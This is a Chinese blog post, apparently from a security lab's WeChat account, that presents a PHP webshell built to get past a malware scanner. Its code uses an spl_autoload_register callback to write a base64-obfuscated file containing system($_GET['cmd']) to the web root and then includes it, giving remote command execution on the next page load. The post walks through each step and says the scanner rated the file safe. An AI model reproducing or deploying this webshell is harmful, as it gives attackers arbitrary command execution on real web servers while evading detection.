> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/WiqZEApL3nVgZDv7nJ4gOw)

  

网安引领时代, 弥天点亮未来

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png)

  

**0x00 具体操作**  

  

**1. 绕过代码如下:**

```
<?php
spl_autoload_register(function ($class_name){
    file_put_contents(base64_decode("YWFh"), base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='));
});
include('aaa');
new aaa();
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDTiaB89dEROUmPfzcyP9TKlGicWvHia2jU1jg2GdEMOHHIxVuiayoLn4tS8gTru1AQIxC5QMmYaNHicCA/640?wx_fmt=png)  
 **2.spl_autoload_register 的作用, 将函数注册到 spl_autoload_register(可以是匿名函数), 当实例化一个不存在的类的时候, 会去调用该函数.**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDTiaB89dEROUmPfzcyP9TKlibvtqfDvEibScT9WmWpsIKKkmJiaje2TZ7g2VQrlbbiaBtcoVGjiaUDWb0A/640?wx_fmt=png)

**3. 先调用 include('aaa'), 会报错, 因为没有这个文件, 之后进行实例化 new aaa(), 又会报错, 因为没有 aaa 这个类, 会去执行 spl_autoload_register 注册的函数里面的代码**  

```
file_put_contents(base64_decode("YWFh"), base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='));
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDTiaB89dEROUmPfzcyP9TKlO8v5KnZn36Jw5bScBUL6rCfxoyianibDb8XHQydbLm4SNCc8NzDqvwAA/640?wx_fmt=png)

**4. 其中 YWFh 解码之后是 aaa,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4 = 解码之后是 <?php system($_GET['cmd']);?>, 相当于在 web 根目录下面创建 aaa 文件写入内容是 <?php system($_GET['cmd']);?>**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDTiaB89dEROUmPfzcyP9TKl5WhS2icBm89DUMaLa1zal6fRicMurJibFOk3LjBsxdibZIGd4VdaCSia6Rg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDTiaB89dEROUmPfzcyP9TKlZKXjicicSRb9iaJp3WIA1EQmuo9B98gfwsZjmtWSzUSbicicibPCZY1VckQQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDTiaB89dEROUmPfzcyP9TKl04WeWrictDInxLESTCRibey2wPdsMZTq4WFRDK973gZLvEwhWBaHCI1w/640?wx_fmt=png)

**5. 第二次再刷新页面, 就可以成功执行了 include('aaa');, 因为第一次访问已经创建 aaa 文件并且写入内容了.  
6. 测试结果, 第二次访问成功执行命令, 后面 Fatal error: Class 'aaa' not found 的报错无视即可.**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDTiaB89dEROUmPfzcyP9TKlypiawpwKGEJPuudzs4F9nKQfPZYe6Xhl7M1XlVI049CVia7rAdJW8aSA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDTiaB89dEROUmPfzcyP9TKliaCJB60mHCErNyj4IVqtxA3QuXKEgAc2lED2tcj4oGGCf4W9ZAE6B1Q/640?wx_fmt=png)

**7. 官网扫描结果, 该文件扫描结果显示的是安全**  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDTiaB89dEROUmPfzcyP9TKlpiaBIDmmuDvLEsIxPYOFUHvZYPfPJmRWgiaFfw82BRQuPOIDJXs5vrMQ/640?wx_fmt=png)

**8. 欢迎加入弥天安全实验室交流群.  
**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAD64Hjzibz9XxY4SwcYXKBWSOYSbvDLUw9ZXUl7oOBJJKQvibd59SOVLr65aKibCrV4Z4Jsjfaia59uw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif) 

知识分享完了

喜欢别忘了关注我们哦~  

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg)